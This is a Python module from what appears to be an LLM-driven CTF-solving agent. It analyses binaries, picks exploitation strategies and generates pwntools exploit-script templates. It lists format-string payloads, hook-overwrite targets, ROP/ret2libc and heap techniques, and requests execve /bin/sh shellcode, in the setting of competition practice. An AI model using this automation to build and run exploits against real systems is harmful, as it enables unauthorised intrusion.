# pwn/nodes.py
"""
Pwn分析节点

节点:
- pwn_analyst_node: 二进制分析与漏洞检测
- pwn_exploiter_node: 利用构建与执行
"""

import json
from typing import Dict, List, Any
from state import CTFState
from llm_client import llm_client
from config import config
from .tools import (
    BinaryAnalyzer,
    ProtectionChecker,
    ROPBuilder,
    ShellcodeGenerator,
    ExploitBuilder,
    BinaryInfo,
    VulnerabilityInfo
)


def pwn_analyst_node(state: Dict) -> Dict:
    """
    [Pwn分析节点] 分析二进制文件并检测漏洞

    输入:
        - binary_path: 二进制文件路径
        - pwn_mode: 是否处于Pwn模式

    输出:
        - binary_info: 二进制信息
        - vulnerabilities: 检测到的漏洞
        - pwn_analysis: 分析结果

    工作流程:
        1. 获取二进制文件路径
        2. 分析二进制信息
        3. 检测保护机制
        4. 查找潜在漏洞
    """
    print("[PwnAnalyst] Starting binary analysis...")

    # 获取二进制路径
    binary_path = state.get("binary_path", "")

    # 尝试从已知事实中提取
    if not binary_path:
        known_facts = state.get("known_facts", "")
        # 查找可能的二进制路径
        import re
        path_match = re.search(r'(?:binary|file|executable)[:\s]+([^\s,]+)', known_facts, re.I)
        if path_match:
            binary_path = path_match.group(1)

    if not binary_path:
        # 尝试从附件中查找
        attachments = state.get("attachments", [])
        for att in attachments:
            if att.get("type") in ["elf", "pe", "binary"]:
                binary_path = att.get("path", "")
                break

    if not binary_path:
        print("[PwnAnalyst] No binary path found")
        return {
            "pwn_analysis": {"status": "no_binary"},
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    try:
        # 分析二进制
        binary_info = BinaryAnalyzer.analyze(binary_path)

        # 检测漏洞
        vulnerabilities = BinaryAnalyzer.find_vulnerabilities(binary_info)

        # 转换为可序列化格式
        binary_info_dict = {
            "path": binary_info.path,
            "arch": binary_info.arch,
            "bits": binary_info.bits,
            "endian": binary_info.endian,
            "protections": binary_info.protections,
            "function_count": len(binary_info.functions),
            "dangerous_functions": [f for f in binary_info.functions
                                   if f in BinaryAnalyzer.DANGEROUS_FUNCTIONS],
            "has_gadgets": len(binary_info.gadgets) > 0,
            "interesting_strings": [s for s in binary_info.strings
                                   if any(kw in s.lower() for kw in ['flag', 'password', 'secret', 'key'])]
        }

        vulns_list = [{
            "type": v.vuln_type,
            "location": v.location,
            "severity": v.severity,
            "exploit_method": v.exploit_method
        } for v in vulnerabilities]

        # LLM深度分析
        llm_analysis = _llm_pwn_analysis(binary_info_dict, vulns_list, state)

        print(f"[PwnAnalyst] Analysis complete: {binary_info.arch}, {len(vulns_list)} vulnerabilities found")

        return {
            "binary_info": binary_info_dict,
            "vulnerabilities": vulns_list,
            "pwn_analysis": {
                "status": "analyzed",
                "arch": binary_info.arch,
                "protections": binary_info.protections,
                "llm_insight": llm_analysis
            },
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    except FileNotFoundError as e:
        print(f"[PwnAnalyst] Binary not found: {e}")
        return {
            "pwn_analysis": {"status": "error", "error": str(e)},
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
            "execution_steps": state.get("execution_steps", 0) + 1
        }
    except Exception as e:
        print(f"[PwnAnalyst] Analysis failed: {e}")
        return {
            "pwn_analysis": {"status": "error", "error": str(e)},
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
            "execution_steps": state.get("execution_steps", 0) + 1
        }


def pwn_exploiter_node(state: Dict) -> Dict:
    """
    [Pwn利用节点] 构建并执行exploit

    输入:
        - binary_info: 二进制信息
        - vulnerabilities: 漏洞列表

    输出:
        - exploit_script: 生成的exploit脚本
        - exploit_result: 执行结果

    工作流程:
        1. 选择目标漏洞
        2. 构建ROP链或shellcode
        3. 生成exploit脚本
        4. 尝试执行
    """
    print("[PwnExploiter] Building exploit...")

    binary_info_dict = state.get("binary_info", {})
    vulnerabilities = state.get("vulnerabilities", [])

    if not binary_info_dict or not vulnerabilities:
        return {
            "error": "No binary info or vulnerabilities available",
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    # 选择最高严重性的漏洞
    high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
    target_vuln = high_vulns[0] if high_vulns else vulnerabilities[0]

    vuln_type = target_vuln.get("type", "unknown")
    arch = binary_info_dict.get("arch", "x64")
    protections = binary_info_dict.get("protections", {})

    exploit_info = {}

    # 根据漏洞类型和保护状态选择策略
    if vuln_type == "buffer_overflow":
        exploit_info = _build_buffer_overflow_exploit(
            binary_info_dict, target_vuln, protections
        )

    elif vuln_type == "format_string":
        exploit_info = _build_format_string_exploit(
            binary_info_dict, target_vuln
        )

    elif vuln_type == "heap_overflow":
        exploit_info = _build_heap_exploit(binary_info_dict, target_vuln)

    else:
        exploit_info = {
            "status": "manual_required",
            "vuln_type": vuln_type,
            "suggestion": "Manual exploit development required"
        }

    # 生成exploit脚本
    if exploit_info.get("status") == "ready":
        script = _generate_exploit_script(binary_info_dict, exploit_info)

        print(f"[PwnExploiter] Exploit script generated ({len(script)} bytes)")

        return {
            "exploit_script": script,
            "exploit_info": exploit_info,
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    print(f"[PwnExploiter] Exploit status: {exploit_info.get('status', 'unknown')}")

    return {
        "exploit_info": exploit_info,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _build_buffer_overflow_exploit(binary_info: Dict, vuln: Dict,
                                    protections: Dict) -> Dict:
    """构建缓冲区溢出exploit"""
    arch = binary_info.get("arch", "x64")

    # 检查保护
    if protections.get("Canary"):
        return {
            "status": "blocked",
            "reason": "Stack canary enabled",
            "suggestion": "Need to leak canary or find canary bypass"
        }

    exploit_method = "unknown"
    shellcode = None
    rop_chain = None

    # NX保护决定策略
    if not protections.get("NX"):
        # 可以注入shellcode
        exploit_method = "shellcode_injection"
        shellcode = ShellcodeGenerator.get_shellcode(arch, "linux", "execve_binsh")
    else:
        # 需要ROP
        exploit_method = "rop_chain"

        # 重建BinaryInfo对象用于ROP构建
        class SimpleBinaryInfo:
            def __init__(self, info):
                self.gadgets = info.get("gadgets", [])
                self.strings = info.get("interesting_strings", [])

        rop_result = ROPBuilder.build_rop_chain(
            SimpleBinaryInfo(binary_info),
            target="execve",
            arch=arch
        )

        if rop_result.get("status") == "ready":
            rop_chain = rop_result
        else:
            # 尝试ret2libc
            exploit_method = "ret2libc"
            rop_chain = {
                "status": "need_addresses",
                "required": ["system", "/bin/sh"],
                "suggestion": "Leak libc address first"
            }

    return {
        "status": "ready",
        "exploit_method": exploit_method,
        "shellcode": shellcode.hex() if shellcode else None,
        "rop_chain": rop_chain,
        "offset_required": True,
        "note": "Need to calculate exact offset"
    }


def _build_format_string_exploit(binary_info: Dict, vuln: Dict) -> Dict:
    """构建格式化字符串exploit"""
    return {
        "status": "ready",
        "exploit_method": "format_string",
        "techniques": [
            "Leak stack data with %p",
            "Leak specific position with %{offset}$p",
            "Write with %n (need to find target address)"
        ],
        "common_payloads": [
            "%p" * 20,  # 泄露栈数据
            "%{offset}$s",  # 读取任意地址
            "%{n}c%{offset}$n"  # 写入任意地址
        ],
        "targets": [
            "__free_hook -> system",
            "__malloc_hook -> one_gadget",
            "GOT entry -> system"
        ],
        "note": "Need to find format string offset"
    }


def _build_heap_exploit(binary_info: Dict, vuln: Dict) -> Dict:
    """构建堆利用exploit"""
    return {
        "status": "partial",
        "exploit_method": "heap_exploitation",
        "techniques": [
            "Fastbin attack",
            "Unsorted bin attack",
            "Tcache poisoning",
            "House of Force",
            "House of Orange"
        ],
        "targets": [
            "__free_hook",
            "__malloc_hook",
            "GOT entries"
        ],
        "note": "Heap exploitation requires detailed heap layout analysis"
    }


def _generate_exploit_script(binary_info: Dict, exploit_info: Dict) -> str:
    """生成exploit脚本"""
    arch = binary_info.get("arch", "x64")
    binary_path = binary_info.get("path", "./binary")

    script = f'''#!/usr/bin/env python3
# Auto-generated PWN exploit script
from pwn import *

# Configuration
binary_path = "{binary_path}"
arch = "{arch}"

# Setup context
context(arch=arch, os='linux', log_level='debug')

# Load binary
elf = ELF(binary_path)

'''

    # 添加exploit特定代码
    method = exploit_info.get("exploit_method", "unknown")

    if method == "shellcode_injection":
        shellcode = exploit_info.get("shellcode", "")
        script += f'''
# Shellcode
shellcode = bytes.fromhex("{shellcode}")

# TODO: Calculate offset
offset = 0  # Replace with actual offset

# Build payload
payload = b'A' * offset
payload += shellcode

'''

    elif method == "rop_chain":
        rop = exploit_info.get("rop_chain", {})
        script += f'''
# ROP Chain
# {rop.get('chain_steps', [])}

# TODO: Fill in addresses
pop_rdi = 0x0  # Find with ROPgadget
bin_sh = 0x0   # Find in binary or libc
system = 0x0   # From libc or PLT

# Build ROP chain
rop = ROP(elf)
# rop.call(system, [bin_sh])

'''

    elif method == "format_string":
        script += f'''
# Format String Exploitation
# Target: {exploit_info.get('targets', [])}

# Step 1: Find format string offset
# Use cyclic pattern or manual testing

# Step 2: Build write primitive
# Example: write address to __free_hook

'''

    script += '''
# Start process
p = process(binary_path)

# Send payload
# p.sendline(payload)

# Interactive shell
p.interactive()
'''

    return script


def _llm_pwn_analysis(binary_info: Dict, vulnerabilities: List[Dict],
                      state: Dict) -> str:
    """使用LLM进行深度Pwn分析"""

    prompt = f"""
Analyze this binary for exploitation opportunities.

## Binary Information
- Architecture: {binary_info.get('arch', 'unknown')}
- Bits: {binary_info.get('bits', 'unknown')}
- Protections: {binary_info.get('protections', {{}})}
- Dangerous Functions: {binary_info.get('dangerous_functions', [])}
- Has ROP Gadgets: {binary_info.get('has_gadgets', False)}

## Detected Vulnerabilities
{json.dumps(vulnerabilities, indent=2)}

## Interesting Strings
{binary_info.get('interesting_strings', [])}

## Task
1. Evaluate exploitability based on protections
2. Suggest exploitation strategy
3. Identify required gadgets or addresses
4. Estimate difficulty level

## Output Format (JSON)
{{
  "exploitable": true/false,
  "difficulty": "easy/medium/hard",
  "strategy": "recommended exploitation approach",
  "required_offsets": ["offsets to calculate"],
  "gadgets_needed": ["gadgets to find"],
  "script_template": "key exploit steps"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())
        return json.dumps(result, indent=2)

    except Exception as e:
        return f"LLM analysis failed: {str(e)}"